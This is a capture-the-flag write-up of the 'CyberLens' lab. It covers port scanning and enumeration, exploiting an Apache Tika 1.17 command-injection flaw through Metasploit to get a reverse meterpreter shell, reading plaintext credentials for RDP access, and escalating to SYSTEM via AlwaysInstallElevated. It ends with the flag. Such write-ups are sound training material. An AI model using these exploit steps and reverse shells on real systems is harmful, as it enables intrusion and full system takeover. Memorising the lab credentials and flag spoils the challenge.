# CTF Writeup: CyberLens

---

# Reconaissance

An Initial Port Scan reveals following information

```
nmap -n -Pn -p- -T4 10.10.205.124
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 15:36 CDT
Nmap scan report for 10.10.205.124
Host is up (0.040s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
61777/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 69.05 seconds
```

An service version detection scan reveals more information


```
nmap -n -Pn -sCV -p 80,135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49676,61777 10.10.205.124
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 15:38 CDT
Nmap scan report for 10.10.205.124
Host is up (0.043s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
|_http-title: CyberLens: Unveiling the Hidden Matrix
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2025-09-10T20:26:27
|_Not valid after:  2026-03-12T20:26:27
|_ssl-date: 2025-09-11T20:39:38+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-11T20:39:30+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-cors: HEAD GET
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: Welcome to the Apache Tika 1.17 Server
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-11T20:39:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.54 seconds
```

Since http is running I mapped 10.10.205.124 in /etc/hosts to domain: cyberlens.thm

```
sudo echo "10.10.205.124 cyberlens.thm" | sudo tee -a /etc/hosts
```

I discovered there is an Image Extractor Functionality implemented in the website.
We can upload files there.
Tried to upload my php-reverse-shell and bypass the functions of the Upload Image Extractor,
but didn't work.

Started enumerating hidden directories and sub-domains utilizing ffuf & gobuster.


```
gobuster dir -u http://cyberlens.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cyberlens.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/images/]
/Images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/Images/]
/css                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/css/]
/js                   (Status: 301) [Size: 232] [--> http://cyberlens.thm/js/]
/IMAGES               (Status: 301) [Size: 236] [--> http://cyberlens.thm/IMAGES/]
/%20                  (Status: 403) [Size: 199]
/*checkout*           (Status: 403) [Size: 199]
/CSS                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/CSS/]
/JS                   (Status: 301) [Size: 232] [--> http://cyberlens.thm/JS/]
/*docroot*            (Status: 403) [Size: 199]
/*                    (Status: 403) [Size: 199]
/con                  (Status: 403) [Size: 199]
/http%3A              (Status: 403) [Size: 199]
/**http%3a            (Status: 403) [Size: 199]
/*http%3A             (Status: 403) [Size: 199]
/aux                  (Status: 403) [Size: 199]
/**http%3A            (Status: 403) [Size: 199]
/%C0                  (Status: 403) [Size: 199]
```
```
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyberlens.thm -H "Host: FUZZ.cyberlens.thm" -fs 8780

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyberlens.thm
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyberlens.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 8780
________________________________________________

:: Progress: [114442/114442] :: Job [1/1] :: 295 req/sec :: Duration: [0:04:49] :: Errors: 0 ::
```

Couldn't retrieve anything in http (80), so I moved on to SMB (445)

```
smbclient -L \\\\cyberlens.thm\\                                
Password for [WORKGROUP\unkn0wn]:
session setup failed: NT_STATUS_ACCESS_DENIED
```

Unfortunately it wasn't possible to retrieve smb shares for me here, since access is denied.

## Vulnerability Assessment

So I decided to move on to port 61777, which is a tika server running on version 1.17.
Which we enumerated through the nmap scan.
Accessing the webpage on port 61777, didn't provide much information, so I decided to
check for CVE's 

```
searchsploit Tika 1.17          
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)   | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                     | windows/remote/46540.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Initial Access

First of all I tried to utilize the payload manually, which didn't work even after looking for other variants of the payload, none worked manually.
So I decided to try it with Metasploit and it worked! We gained a meterpreter session
as user "CyberLens".
The configurations I did were the following:
```
search tika 
use 0
options
set LHOST 10.21.156.104
set RHOSTS cyberlens.thm
set RPORT 61777
exploit
```
```
msf6 exploit(windows/http/apache_tika_jp2_jscript) > run
[*] Started reverse TCP handler on 10.21.156.104:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.10.205.124:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (177734 bytes) to 10.10.205.124
[*] Meterpreter session 1 opened (10.21.156.104:4444 -> 10.10.205.124:49942) at 2025-09-11 16:26:28 -0500

meterpreter > getuid
Server username: CYBERLENS\CyberLens
```

The hint in getting admin flag, actually tells us to utilize rdp, but I do not have credentials.
Initially I tried to get credentials through C:\Windows\Panther\Unattend.xml, but it didnt exist/ I had no access in the Unattend directory.
I found the credentials of the CyberLens User in C:\Users\CyberLens\Documents\Management

```
C:\Users\CyberLens\Documents\Management>type CyberLens-Management.txt
type CyberLens-Management.txt
Remember, manual enumeration is often key in an engagement ;)

CyberLens
HackSmarter123
```
```
CyberLens:HackSmarter123
```

Utilizing the following command enabled me to connect into the target server via RDP.

```
xfreerdp3 /v:cyberlens.thm /u:CyberLens /p:HackSmarter123
```

Opening up the File Explorer immediatly revealed crucial information, which could
be the way to unlock elevated privileges. In the "Recent Files" Section are 4 Files displayed.
RunHidden.vbs & startup.bat look very interesting and are located in:

```
C:\Users\CyberLens\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```

Analyzing the RunHidden.vbs showed me that there is multiple executables being ran which we can replace with our own payload.

```
type RunHidden.vbs
Set oShell = CreateObject("WScript.Shell") 
strCommand = "java -cp ""C:\Apache-Tika\tika-server-1.17.jar;C:\Apache-Tika\jakarta.xml.bind-api-2.3.2.jar"" org.apache.tika.server.TikaServerCli --cors=* --host 0.0.0.0 --port=61777" 
oShell.Run strCommand, 0, false 
strCommand = "C:\Apache24\bin\httpd.exe" 
oShell.Run strCommand, 0, false 
```

I have gained meterpreter sessions multiple times by manipulating those scripts, but it all backfired and I only gained meterpreter with the same privs I have rn.

## Privilege Escalation

At last I decided to run the local_exploit_suggester module from metasploit on my current session.

```
CTRL+Z to background session
use post/multi/recon/local_exploit_suggester
options
set SESSION 1
exploit
:
msf6 post(multi/recon/local_exploit_suggester) > exploit
[*] 10.10.205.124 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.205.124 - 204 exploit checks are being tried...
[+] 10.10.205.124 - exploit/windows/local/always_install_elevated: The target is vulnerable.
```

The module actually suggested me more exploits, but I decided to start with this one.


```
use exploit/windows/local/always_install_elevated
options
set LHOST 10.21.156.104
set LPORT 9999
set SESSION 1
exploit
```

After running the exploit module, I gained meterpreter session as NT AUTHORITY\SYSTEM


```
exploit
[*] Started reverse TCP handler on 10.21.156.104:9999 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\lnkRcHkfZCq.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 10.10.205.124
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\lnkRcHkfZCq.msi
[*] Meterpreter session 2 opened (10.21.156.104:9999 -> 10.10.205.124:50038) at 2025-09-11 17:33:04 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Retrieved admin.txt in C:\Users\Administrator\Desktop

```
THM{3lev@t3D-4-pr1v35c!}
```
